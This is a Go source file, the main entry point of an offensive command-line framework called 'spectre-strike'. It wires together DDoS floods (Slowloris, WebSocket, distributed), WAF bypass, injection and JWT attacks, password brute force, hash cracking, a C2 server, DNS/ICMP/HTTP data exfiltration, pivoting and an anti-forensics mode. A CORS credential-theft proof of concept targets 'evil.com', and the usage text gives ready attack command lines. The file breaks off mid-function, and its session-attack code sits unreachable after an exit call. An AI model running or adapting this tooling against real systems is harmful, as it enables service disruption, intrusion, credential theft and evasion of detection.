package main

import (
	"spectre-strike/pkg/api"
	"spectre-strike/pkg/attacks"
	"spectre-strike/pkg/cors"
	"spectre-strike/pkg/dns"
	"spectre-strike/pkg/exploitation"
	"spectre-strike/pkg/fuzzer"
	"spectre-strike/pkg/graphql"
	"spectre-strike/pkg/intelligence"
	"spectre-strike/pkg/jwt"
	"spectre-strike/pkg/network"
	"spectre-strike/pkg/nosql"
	"spectre-strike/pkg/redteam"
	"spectre-strike/pkg/scanner"
	sessionpkg "spectre-strike/pkg/session"
	"spectre-strike/pkg/ssl"
	"spectre-strike/pkg/utils"
	"spectre-strike/pkg/waf"
	"spectre-strike/pkg/webhook"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/fatih/color"
)

const banner = `
    ╔═══════════════════════════════════════════════════════════╗
    ║     ADVANCED ATTACK TOOL v4.0 - PROFESSIONAL EDITION     ║
    ║          Next-Gen Red Team Attack Framework               ║
    ╚═══════════════════════════════════════════════════════════╝
`

func main() {
	color.Cyan(banner)

	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
		return
	}

	command := os.Args[1]
	switch command {
	// Legacy Attack Commands
	case "slowloris":
		runSlowloris()
	case "adaptive":
		runAdaptive()
	case "websocket":
		runWebSocket()
	case "waf-bypass":
		runWAFBypass()
	case "scan":
		runScanner()
	case "hybrid":
		runHybrid()
	// New Professional Attack Modules
	case "webhook":
		runWebhookAttack()
	case "api-attack":
		runAPIAttack()
	case "graphql":
		runGraphQLAttack()
	case "nosql":
		runNoSQLAttack()
	case "cors":
		runCORSAttack()
	case "fuzzer":
		runFuzzer()
	case "dns":
		runDNSAttack()
	case "ssl":
		runSSLAttack()
	case "jwt":
		runJWTAttack()
	case "session":
		runSessionAttack()
	// Red Team Operations
	case "recon":
		runRecon()
	case "stealth":
		runStealth()
	case "c2":
		runC2()
	case "exfil":
		runExfiltration()
	case "pivot":
		runPivot()
	case "distributed":
		runDistributed()
	// Web Exploitation
	case "web-scan":
		runWebScan()
	case "sqli":
		runSQLInjection()
	case "xss":
		runXSS()
	case "lfi":
		runLFI()
	case "dir-brute":
		runDirBrute()
	// Password Attacks
	case "password-brute":
		runPasswordBrute()
	case "hash-crack":
		runHashCrack()
	// Network Operations
	case "port-scan":
		runPortScan()
	case "service-enum":
		runServiceEnum()
	case "subnet-scan":
		runSubnetScan()
	// ML Intelligence
	case "ml-attack":
		runMLAttack()
	case "ml-analyze":
		runMLAnalyze()
	case "api-server":
		runAPIServer()
	case "help":
		printUsage()
	default:
		color.Red("❌ Unknown command: %s\n", command)
		printUsage()
		os.Exit(1)
	}
}

func runSlowloris() {
	fs := flag.NewFlagSet("slowloris", flag.ExitOnError)
	target := fs.String("target", "", "Target URL")
	duration := fs.Int("duration", 60, "Attack duration in seconds")
	connections := fs.Int("connections", 200, "Number of connections")
	mode := fs.String("mode", "normal", "Attack mode: stealth, burst, wave, tsunami")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	config := attacks.SlowlorisConfig{
		Target:      *target,
		Duration:    time.Duration(*duration) * time.Second,
		Connections: *connections,
		Mode:        attacks.AttackMode(*mode),
	}

	color.Green("🚀 Starting Slowloris Attack")
	color.Cyan("   Target: %s", *target)
	color.Cyan("   Duration: %d seconds", *duration)
	color.Cyan("   Connections: %d", *connections)
	color.Cyan("   Mode: %s", *mode)
	fmt.Println()

	if err := attacks.LaunchSlowloris(config); err != nil {
		color.Red("❌ Attack failed: %v", err)
		os.Exit(1)
		return
	}
	color.Green("✅ Attack completed successfully")
}

func runAdaptive() {
	fs := flag.NewFlagSet("adaptive", flag.ExitOnError)
	target := fs.String("target", "", "Target URL")
	duration := fs.Int("duration", 60, "Attack duration in seconds")
	mode := fs.String("mode", "find-limit", "Mode: find-limit, sustained, spike, ramp, chaos")
	maxRate := fs.Int("max-rate", 1000, "Maximum requests per second")
	maxThreads := fs.Int("max-threads", 200, "Maximum concurrent threads")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	config := attacks.AdaptiveConfig{
		Target:     *target,
		Duration:   time.Duration(*duration) * time.Second,
		Mode:       *mode,
		MaxRate:    *maxRate,
		MaxThreads: *maxThreads,
	}

	color.Green("🎯 Starting Adaptive Attack")
	color.Cyan("   Target: %s", *target)
	color.Cyan("   Duration: %d seconds", *duration)
	color.Cyan("   Mode: %s", *mode)
	color.Yellow("   ⚡ Auto-adjusting based on target response...")
	fmt.Println()

	if err := attacks.LaunchAdaptive(config); err != nil {
		color.Red("❌ Attack failed: %v", err)
		os.Exit(1)
		return
	}
	color.Green("✅ Attack completed successfully")
}

func runWebSocket() {
	fs := flag.NewFlagSet("websocket", flag.ExitOnError)
	target := fs.String("target", "", "WebSocket URL (ws:// or wss://)")
	duration := fs.Int("duration", 60, "Attack duration in seconds")
	connections := fs.Int("connections", 100, "Number of WebSocket connections")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	config := attacks.WebSocketConfig{
		Target:      *target,
		Duration:    time.Duration(*duration) * time.Second,
		Connections: *connections,
	}

	color.Green("🌐 Starting WebSocket Flood")
	color.Cyan("   Target: %s", *target)
	color.Cyan("   Duration: %d seconds", *duration)
	color.Cyan("   Connections: %d", *connections)
	fmt.Println()

	if err := attacks.LaunchWebSocketFlood(config); err != nil {
		color.Red("❌ Attack failed: %v", err)
		os.Exit(1)
		return
	}
	color.Green("✅ Attack completed successfully")
}

func runWAFBypass() {
	fs := flag.NewFlagSet("waf-bypass", flag.ExitOnError)
	target := fs.String("target", "", "Target URL")
	duration := fs.Int("duration", 60, "Attack duration in seconds")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	color.Green("🛡️  Starting WAF Bypass Attack")
	color.Cyan("   Target: %s", *target)
	color.Yellow("   🔍 Detecting WAF...")
	fmt.Println()

	wafType := waf.DetectWAF(*target)
	if wafType != "" {
		color.Yellow("   ⚠️  Detected WAF: %s", wafType)
		color.Cyan("   🔧 Applying bypass techniques...")
	} else {
		color.Green("   ✅ No WAF detected")
	}
	fmt.Println()

	config := attacks.WAFBypassConfig{
		Target:   *target,
		Duration: time.Duration(*duration) * time.Second,
		WAFType:  wafType,
	}

	if err := attacks.LaunchWAFBypass(config); err != nil {
		color.Red("❌ Attack failed: %v", err)
		os.Exit(1)
		return
	}
	color.Green("✅ Attack completed successfully")
}

func runScanner() {
	fs := flag.NewFlagSet("scan", flag.ExitOnError)
	target := fs.String("target", "", "Target host")
	ports := fs.String("ports", "80,443,8080,8443", "Ports to scan (comma-separated)")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	color.Green("🔍 Starting Vulnerability Scanner")
	color.Cyan("   Target: %s", *target)
	color.Cyan("   Ports: %s", *ports)
	fmt.Println()

	results := scanner.Scan(*target, *ports)

	color.Cyan("\n📊 Scan Results:")
	color.Cyan("   ══════════════════════════════════════")
	for _, result := range results {
		if result.Open {
			color.Green("   ✅ Port %d - OPEN - %s", result.Port, result.Service)
			if result.Version != "" {
				color.Yellow("      Version: %s", result.Version)
			}
			if len(result.Headers) > 0 {
				if server, ok := result.Headers["Server"]; ok {
					color.Magenta("      Server: %s", server)
				}
			}
		}
	}

	color.Green("\n✅ Scan completed")
}

func runHybrid() {
	fs := flag.NewFlagSet("hybrid", flag.ExitOnError)
	target := fs.String("target", "", "Target URL")
	duration := fs.Int("duration", 60, "Attack duration in seconds")
	vectors := fs.String("vectors", "slowloris,http2,adaptive", "Attack vectors (comma-separated)")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	config := attacks.HybridConfig{
		Target:   *target,
		Duration: time.Duration(*duration) * time.Second,
		Vectors:  utils.ParseVectors(*vectors),
	}

	color.Green("💥 Starting Hybrid Multi-Vector Attack")
	color.Cyan("   Target: %s", *target)
	color.Cyan("   Duration: %d seconds", *duration)
	color.Cyan("   Vectors: %s", *vectors)
	color.Yellow("   ⚡ Coordinating multiple attack methods...")
	fmt.Println()

	if err := attacks.LaunchHybrid(config); err != nil {
		color.Red("❌ Attack failed: %v", err)
		os.Exit(1)
		return
	}
	color.Green("✅ Attack completed successfully")
}

func runWebhookAttack() {
	fs := flag.NewFlagSet("webhook", flag.ExitOnError)
	url := fs.String("url", "", "Webhook URL")
	count := fs.Int("count", 100, "Number of requests to send")
	threads := fs.Int("threads", 10, "Number of concurrent threads")
	payload := fs.String("payload", "", "JSON payload file (optional)")
	hmac := fs.String("hmac-secret", "", "HMAC signing secret")
	fs.Parse(os.Args[2:])

	if *url == "" {
		color.Red("❌ Webhook URL is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	client := webhook.NewWebhookClient([]string{*url}, *hmac)
	if *payload != "" {
		client.Flood(*payload, nil, *count, *threads)
	} else {
		client.Flood(`{"event":"test"}`, nil, *count, *threads)
	}
}

func runAPIAttack() {
	fs := flag.NewFlagSet("api-attack", flag.ExitOnError)
	target := fs.String("target", "", "API base URL")
	attack := fs.String("attack", "all", "Attack: sqli,xss,idor,ssrf,jwt,cmd,all")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	attacker := api.NewAPIAttacker(*target)
	switch *attack {
	case "sqli":
		attacker.SQLiScan(*target, []string{})
	case "xss":
		attacker.XSSScan(*target, []string{})
	case "idor":
		attacker.IDORScan(*target, []int{1, 2, 3, 4, 5}, 10)
	case "ssrf":
		attacker.SSRFScan(*target, []string{})
	case "jwt":
		attacker.JWTBypass(*target, "")
	case "cmd":
		attacker.CommandInjectionScan(*target, []string{})
	case "all":
		attacker.SQLiScan(*target, []string{})
		attacker.XSSScan(*target, []string{})
		attacker.IDORScan(*target, []int{1, 2, 3, 4, 5}, 10)
		attacker.SSRFScan(*target, []string{})
	}
}

func runGraphQLAttack() {
	fs := flag.NewFlagSet("graphql", flag.ExitOnError)
	endpoint := fs.String("endpoint", "", "GraphQL endpoint URL")
	attack := fs.String("attack", "introspect", "Attack: introspect,sqli,nosqli,batch,depth,all")
	fs.Parse(os.Args[2:])

	if *endpoint == "" {
		color.Red("❌ Endpoint required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	attacker := graphql.NewGraphQLAttacker(*endpoint)
	switch *attack {
	case "introspect":
		attacker.Introspect()
	case "sqli":
		attacker.SQLInjection([]string{})
	case "nosqli":
		attacker.NoSQLInjection([]string{})
	case "batch":
		attacker.BatchingAttack([]string{}, 10)
	case "depth":
		attacker.DepthAttack(10)
	case "all":
		attacker.Introspect()
		attacker.SQLInjection([]string{})
		attacker.BatchingAttack([]string{}, 10)
	}
}

func runNoSQLAttack() {
	fs := flag.NewFlagSet("nosql", flag.ExitOnError)
	target := fs.String("target", "", "Target URL")
	db := fs.String("db", "mongodb", "Database: mongodb,redis,couch,elastic")
	attack := fs.String("attack", "inject", "Attack: inject,bypass,extract")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	attacker := nosql.NewNoSQLAttacker(*target)
	switch *db {
	case "mongodb":
		if *attack == "bypass" {
			attacker.AuthBypass(*target, "admin", "password")
		} else {
			attacker.MongoDBInjection(*target, []string{})
		}
	case "redis":
		attacker.RedisInjection(*target, 6379)
	case "elastic":
		attacker.ElasticSearchInjection(*target)
	}
}

func runCORSAttack() {
	fs := flag.NewFlagSet("cors", flag.ExitOnError)
	target := fs.String("target", "", "Target URL")
	attack := fs.String("attack", "all", "Attack: scan,cred,preflight,cache,header,all")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	attacker := cors.NewCORSAttacker(*target)
	endpoints := []string{"", "/api", "/api/v1", "/graphql", "/user", "/admin"}

	switch *attack {
	case "scan":
		attacker.Scan(endpoints, 10)
	case "cred":
		poc := attacker.CredentialTheft(*target, "https://evil.com")
		color.Cyan("Generated PoC:\n%s", poc)
	case "preflight":
		attacker.PreflightBypass(*target)
	case "cache":
		attacker.CachePoison(*target)
	case "header":
		attacker.HeaderInjection(*target)
	case "all":
		attacker.FullScan(endpoints, 10)
	}
}

func runFuzzer() {
	fs := flag.NewFlagSet("fuzzer", flag.ExitOnError)
	target := fs.String("target", "", "Target URL")
	attack := fs.String("attack", "dir", "Attack: dir,param,header,vhost,ext,recursive,mutation")
	wordlist := fs.String("wordlist", "", "Wordlist file")
	threads := fs.Int("threads", 20, "Threads")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	f := fuzzer.NewFuzzer(*target)
	switch *attack {
	case "dir":
		f.DirectoryBruteforce(*threads)
	case "param":
		f.ParameterFuzz(*wordlist, []string{}, *threads)
	case "header":
		f.HeaderFuzz(*wordlist, *threads)
	case "vhost":
		f.VHostFuzz(*wordlist, []string{}, *threads)
	case "ext":
		f.ExtensionFuzz(*wordlist, *threads)
	case "recursive":
		f.RecursiveFuzz(*threads, 3)
	case "mutation":
		f.MutationFuzz(*target, *wordlist, *threads)
	}
}

func runDNSAttack() {
	fs := flag.NewFlagSet("dns", flag.ExitOnError)
	target := fs.String("target", "", "Target domain")
	attack := fs.String("attack", "subdomain", "Attack: subdomain,zone,rebind,takeover,tunnel,all")
	wordlist := fs.String("wordlist", "", "Subdomain wordlist")
	threads := fs.Int("threads", 50, "Threads")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	attacker := dns.NewDNSAttacker(*target)
	switch *attack {
	case "subdomain":
		attacker.SubdomainBruteforce([]string{*wordlist}, *threads)
	case "zone":
		attacker.ZoneTransfer()
	case "rebind":
		attacker.DNSRebinding(*target, "127.0.0.1", *threads)
	case "takeover":
		attacker.SubdomainTakeover(*threads)
	case "tunnel":
		attacker.DNSTunneling("test data")
	case "all":
		attacker.SubdomainBruteforce([]string{*wordlist}, *threads)
		attacker.ZoneTransfer()
		attacker.SubdomainTakeover(*threads)
	}
}

func runSSLAttack() {
	fs := flag.NewFlagSet("ssl", flag.ExitOnError)
	target := fs.String("target", "", "Target host:port")
	attack := fs.String("attack", "all", "Attack: cert,heartbleed,crime,beast,poodle,all")
	timeout := fs.Int("timeout", 10, "Connection timeout in seconds")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	attacker := ssl.NewSSLAttacker(*target, *timeout)
	switch *attack {
	case "cert":
		attacker.CertificateAnalysis()
	case "heartbleed":
		attacker.HeartbleedScan()
	case "crime":
		attacker.CRIMETest()
	case "beast":
		attacker.BEASTTest()
	case "poodle":
		attacker.POODLETest()
	case "all":
		attacker.CertificateAnalysis()
		attacker.ProtocolVersionScan()
		attacker.HeartbleedScan()
		attacker.CRIMETest()
		attacker.BEASTTest()
		attacker.POODLETest()
	}
}

func runJWTAttack() {
	fs := flag.NewFlagSet("jwt", flag.ExitOnError)
	token := fs.String("token", "", "JWT token")
	attack := fs.String("attack", "all", "Attack: none,confusion,brute,kid,priv,all")
	wordlist := fs.String("wordlist", "", "Secret wordlist")
	threads := fs.Int("threads", 10, "Number of threads")
	fs.Parse(os.Args[2:])

	if *token == "" {
		color.Red("❌ Token required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	attacker := jwt.NewJWTAttacker(*token)
	switch *attack {
	case "none":
		attacker.NoneAlgorithm()
	case "confusion":
		attacker.AlgorithmConfusion("")
	case "brute":
		attacker.WeakSecretBruteforce([]string{*wordlist}, *threads)
	case "kid":
		attacker.KIDInjection()
	case "priv":
		attacker.PrivilegeEscalation()
	case "all":
		attacker.NoneAlgorithm()
		attacker.KIDInjection()
		attacker.PrivilegeEscalation()
	}
}

func runSessionAttack() {
	fs := flag.NewFlagSet("session", flag.ExitOnError)
	target := fs.String("target", "", "Target URL")
	attack := fs.String("attack", "all", "Attack: fixation,predict,hijack,csrf,all")
	sessionCookie := fs.String("session", "", "Session cookie")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target required")
		fs.PrintDefaults()
		os.Exit(1)
		attacker := sessionpkg.NewSessionAttacker(*target)
		switch *attack {
		case "fixation":
			attacker.SessionFixation(*target)
		case "predict":
			attacker.SessionPrediction([]string{})
		case "hijack":
			if *sessionCookie != "" {
				cookie := &http.Cookie{Name: "session", Value: *sessionCookie}
				attacker.SessionHijacking(cookie, *target)
			}
		case "csrf":
			attacker.CSRFTest(*target, "POST", map[string]string{})
		case "all":
			attacker.SessionFixation(*target)
			attacker.SessionPrediction([]string{})
			attacker.CSRFTest(*target, "POST", map[string]string{})
		}
	}
}

func printUsage() {
	color.Cyan("\n📖 Usage: ./attack <command> [options]\n")

	color.White("\n💥 Professional Attack Modules:")
	color.Green("  webhook         ")
	fmt.Println("- Webhook flood and replay attack")
	color.Green("  api-attack      ")
	fmt.Println("- API exploitation (SQLi, XSS, IDOR, JWT)")
	color.Green("  graphql         ")
	fmt.Println("- GraphQL introspection and injection")
	color.Green("  nosql           ")
	fmt.Println("- NoSQL injection (MongoDB, Redis, Elastic)")
	color.Green("  cors            ")
	fmt.Println("- CORS misconfiguration testing")
	color.Green("  fuzzer          ")
	fmt.Println("- Advanced web fuzzer")
	color.Green("  dns             ")
	fmt.Println("- DNS attacks (subdomain, zone transfer)")
	color.Green("  ssl             ")
	fmt.Println("- SSL/TLS vulnerability scanner")
	color.Green("  jwt             ")
	fmt.Println("- JWT token attacks and analysis")
	color.Green("  session         ")
	fmt.Println("- Session management attacks")

	color.White("\n🎯 DDoS/Stress Testing:")
	color.Green("  slowloris       ")
	fmt.Println("- Slowloris connection exhaustion attack")
	color.Green("  adaptive        ")
	fmt.Println("- ML-powered adaptive attack")
	color.Green("  websocket       ")
	fmt.Println("- WebSocket connection flood")
	color.Green("  waf-bypass      ")
	fmt.Println("- WAF detection and bypass attack")
	color.Green("  hybrid          ")
	fmt.Println("- Multi-vector coordinated attack")

	color.White("\n🕵️  Red Team Operations:")
	color.Magenta("  recon           ")
	fmt.Println("- Advanced reconnaissance and OSINT")
	color.Magenta("  stealth         ")
	fmt.Println("- Anti-detection stealth attack")
	color.Magenta("  c2              ")
	fmt.Println("- Start C2 command and control server")
	color.Magenta("  exfil           ")
	fmt.Println("- Data exfiltration via DNS/ICMP/HTTP")
	color.Magenta("  pivot           ")
	fmt.Println("- Pivot attack through compromised hosts")
	color.Magenta("  distributed     ")
	fmt.Println("- Coordinated distributed attack")

	color.White("\n🌐 Web Exploitation:")
	color.Yellow("  web-scan        ")
	fmt.Println("- Comprehensive web vulnerability scanner")
	color.Yellow("  sqli            ")
	fmt.Println("- SQL injection testing")
	color.Yellow("  xss             ")
	fmt.Println("- Cross-site scripting testing")
	color.Yellow("  lfi             ")
	fmt.Println("- Local/Remote file inclusion testing")
	color.Yellow("  dir-brute       ")
	fmt.Println("- Directory/file brute forcing")

	color.White("\n🔐 Password Attacks:")
	color.Red("  password-brute  ")
	fmt.Println("- Password brute force attack")
	color.Red("  hash-crack      ")
	fmt.Println("- Hash cracking (MD5, SHA1, SHA256)")

	color.White("\n🔍 Network Operations:")
	color.Cyan("  scan            ")
	fmt.Println("- Quick vulnerability scanner")
	color.Cyan("  port-scan       ")
	fmt.Println("- Advanced port scanner")
	color.Cyan("  service-enum    ")
	fmt.Println("- Service enumeration")
	color.Cyan("  subnet-scan     ")
	fmt.Println("- Subnet host discovery")

	color.White("\n📚 Examples:")
	color.White("  # Professional Modules")
	color.Green("  ./attack webhook -url https://hooks.example.com/webhook -count 1000")
	color.Green("  ./attack api-attack -target https://api.example.com -scan all")
	color.Green("  ./attack graphql -endpoint https://api.example.com/graphql")
	color.Green("  ./attack jwt -token eyJhbGc... -attack all")
	color.Green("  ./attack dns -target example.com -attack all")

	color.White("\n  # Web Exploitation")
	color.Yellow("  ./attack web-scan -target https://example.com -depth medium")
	color.Yellow("  ./attack dir-brute -target https://example.com -wordlist dirs.txt")

	color.White("\n  # Password Attacks")
	color.Red("  ./attack password-brute -target https://example.com/login -user admin -wordlist passwords.txt")
	color.Red("  ./attack hash-crack -hash 5f4dcc3b5aa765d61d8327deb882cf99 -type md5 -wordlist rockyou.txt")

	color.White("\n  # Network Operations")
	color.Cyan("  ./attack port-scan -target 192.168.1.100 -ports 1-65535 -threads 100")
	color.Cyan("  ./attack subnet-scan -subnet 192.168.1.0/24 -threads 50")
	color.Cyan("  ./attack service-enum -target 192.168.1.100 -port 80 -service HTTP")

	color.White("\n  # DDoS/Stress Testing")
	color.Green("  ./attack slowloris -target https://example.com -duration 120 -mode stealth")
	color.Green("  ./attack adaptive -target https://example.com -duration 180")
	color.Green("  ./attack hybrid -target https://example.com -vectors slowloris,http2,adaptive")

	color.White("\n  # Red Team Operations")
	color.Magenta("  ./attack recon -target example.com -ports 1-1000")
	color.Magenta("  ./attack stealth -target https://example.com -proxy 127.0.0.1:9050 -duration 600")
	color.Magenta("  ./attack c2 -c2-port 8443")
	color.Magenta("  ./attack distributed -target https://example.com -nodes 10.0.0.1,10.0.0.2\n")
}

func runRecon() {
	fs := flag.NewFlagSet("recon", flag.ExitOnError)
	target := fs.String("target", "", "Target host/domain")
	ports := fs.String("ports", "80,443,8080,8443,3306,5432,27017,6379", "Ports to scan")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	redteam.RunAdvancedRecon(*target, *ports)
}

func runStealth() {
	fs := flag.NewFlagSet("stealth", flag.ExitOnError)
	target := fs.String("target", "", "Target URL")
	duration := fs.Int("duration", 600, "Attack duration in seconds")
	proxy := fs.String("proxy", "", "SOCKS5 proxy (host:port)")
	obfuscate := fs.Bool("obfuscate", true, "Enable traffic obfuscation")
	noLogs := fs.Bool("no-logs", true, "Disable local logging (anti-forensics)")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	config := redteam.StealthConfig{
		Target:    *target,
		Duration:  time.Duration(*duration) * time.Second,
		Proxy:     *proxy,
		Obfuscate: *obfuscate,
		NoLogs:    *noLogs,
		UseJitter: true,
	}

	if *proxy != "" {
		color.Yellow("🔒 Routing through proxy: %s", *proxy)
	}

	if *noLogs {
		redteam.AntiForensics()
	}

	if err := redteam.RunStealthAttack(config); err != nil {
		color.Red("❌ Attack failed: %v", err)
		os.Exit(1)
		return
	}
	color.Green("✅ Stealth attack completed")
}

func runC2() {
	fs := flag.NewFlagSet("c2", flag.ExitOnError)
	port := fs.Int("c2-port", 8443, "C2 server port")
	fs.Parse(os.Args[2:])

	color.Yellow("⚠️  Note: Generate TLS certificates first:")
	color.White("   openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n")

	if err := redteam.StartC2Server(*port); err != nil {
		color.Red("❌ C2 server failed: %v", err)
		os.Exit(1)
	}
}

func runExfiltration() {
	fs := flag.NewFlagSet("exfil", flag.ExitOnError)
	target := fs.String("target", "", "Target host/domain")
	method := fs.String("method", "dns", "Exfiltration method: dns, icmp, http")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	if err := redteam.RunExfiltration(*target, *method); err != nil {
		color.Red("❌ Exfiltration failed: %v", err)
		os.Exit(1)
		return
	}
	color.Green("✅ Exfiltration completed")
}

func runPivot() {
	fs := flag.NewFlagSet("pivot", flag.ExitOnError)
	target := fs.String("target", "", "Target URL")
	duration := fs.Int("duration", 300, "Attack duration in seconds")
	proxy := fs.String("proxy", "", "Pivot proxy (SOCKS5 host:port)")
	fs.Parse(os.Args[2:])

	if *target == "" || *proxy == "" {
		color.Red("❌ Target and proxy are required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	if err := redteam.RunPivotAttack(*target, time.Duration(*duration)*time.Second, *proxy); err != nil {
		color.Red("❌ Pivot attack failed: %v", err)
		os.Exit(1)
		return
	}
}

func runDistributed() {
	fs := flag.NewFlagSet("distributed", flag.ExitOnError)
	target := fs.String("target", "", "Target URL")
	duration := fs.Int("duration", 300, "Attack duration in seconds")
	nodes := fs.String("nodes", "", "Comma-separated list of attack nodes (IP:port)")
	rate := fs.Int("rate", 100, "Requests per second per node")
	threads := fs.Int("threads", 10, "Threads per node")
	fs.Parse(os.Args[2:])

	if *target == "" || *nodes == "" {
		color.Red("❌ Target and nodes are required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	nodeList := strings.Split(*nodes, ",")
	config := redteam.DistributedConfig{
		Target:   *target,
		Duration: time.Duration(*duration) * time.Second,
		Nodes:    nodeList,
		Rate:     *rate,
		Threads:  *threads,
	}

	if err := redteam.RunDistributedAttack(config); err != nil {
		color.Red("❌ Distributed attack failed: %v", err)
		os.Exit(1)
		return
	}
}

// Web Exploitation Functions
func runWebScan() {
	fs := flag.NewFlagSet("web-scan", flag.ExitOnError)
	target := fs.String("target", "", "Target URL")
	depth := fs.String("depth", "medium", "Scan depth: light, medium, deep")
	verbose := fs.Bool("verbose", true, "Verbose output")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	depthMap := map[string]int{
		"light":  1,
		"medium": 2,
		"deep":   3,
	}

	scanner := exploitation.NewVulnScanner(*target, depthMap[*depth], *verbose)
	if err := scanner.ScanAll(); err != nil {
		color.Red("❌ Scan failed: %v", err)
		os.Exit(1)
		return
	}
	color.Green("✅ Web vulnerability scan completed")
}

func runSQLInjection() {
	fs := flag.NewFlagSet("sqli", flag.ExitOnError)
	target := fs.String("target", "", "Target URL")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	scanner := exploitation.NewVulnScanner(*target, 2, true)
	if err := scanner.ScanSQLInjection(); err != nil {
		color.Red("❌ SQL injection scan failed: %v", err)
		os.Exit(1)
		return
	}
	scanner.PrintResults()
	color.Green("✅ SQL injection scan completed")
}

func runXSS() {
	fs := flag.NewFlagSet("xss", flag.ExitOnError)
	target := fs.String("target", "", "Target URL")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	scanner := exploitation.NewVulnScanner(*target, 2, true)
	if err := scanner.ScanXSS(); err != nil {
		color.Red("❌ XSS scan failed: %v", err)
		os.Exit(1)
		return
	}
	scanner.PrintResults()
	color.Green("✅ XSS scan completed")
}

func runLFI() {
	fs := flag.NewFlagSet("lfi", flag.ExitOnError)
	target := fs.String("target", "", "Target URL")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	scanner := exploitation.NewVulnScanner(*target, 2, true)
	if err := scanner.ScanFileInclusion(); err != nil {
		color.Red("❌ LFI scan failed: %v", err)
		os.Exit(1)
		return
	}
	scanner.PrintResults()
	color.Green("✅ File inclusion scan completed")
}

func runDirBrute() {
	fs := flag.NewFlagSet("dir-brute", flag.ExitOnError)
	target := fs.String("target", "", "Target URL")
	wordlist := fs.String("wordlist", "wordlists/directories.txt", "Wordlist file")
	extensions := fs.String("extensions", ".php,.html,.txt,.bak,.old", "Extensions to try")
	threads := fs.Int("threads", 20, "Number of threads")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	extList := strings.Split(*extensions, ",")
	brute := exploitation.NewDirectoryBrute(*target, *wordlist, extList, *threads)

	if err := brute.Brute(); err != nil {
		color.Red("❌ Directory brute force failed: %v", err)
		os.Exit(1)
		return
	}
	color.Green("✅ Directory brute force completed")
}

// Password Attack Functions
func runPasswordBrute() {
	fs := flag.NewFlagSet("password-brute", flag.ExitOnError)
	target := fs.String("target", "", "Target URL or host")
	users := fs.String("users", "admin", "Username(s) or file with usernames")
	passwords := fs.String("passwords", "wordlists/passwords.txt", "Password(s) or wordlist file")
	protocol := fs.String("protocol", "http-basic", "Protocol: http-basic, http-form, ssh, ftp")
	threads := fs.Int("threads", 10, "Number of threads")
	loginURL := fs.String("login-url", "", "Login form URL (for http-form)")
	userField := fs.String("user-field", "username", "Username form field name")
	passField := fs.String("pass-field", "password", "Password form field name")
	successPattern := fs.String("success", "", "Success pattern in response")
	failPattern := fs.String("fail", "", "Failure pattern in response")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	brute := exploitation.NewPasswordBrute(*target, *protocol, *threads)
	brute.SetUsers(*users)
	brute.SetPasswords(*passwords)

	// Configure form-based auth if needed
	if *protocol == "http-form" {
		if *loginURL == "" {
			*loginURL = *target
		}
		brute.FormData = exploitation.FormConfig{
			LoginURL:       *loginURL,
			UsernameField:  *userField,
			PasswordField:  *passField,
			SuccessPattern: *successPattern,
			FailurePattern: *failPattern,
			Method:         "POST",
		}
	}

	if err := brute.Brute(); err != nil {
		color.Red("❌ Password brute force failed: %v", err)
		os.Exit(1)
		return
	}
}

func runHashCrack() {
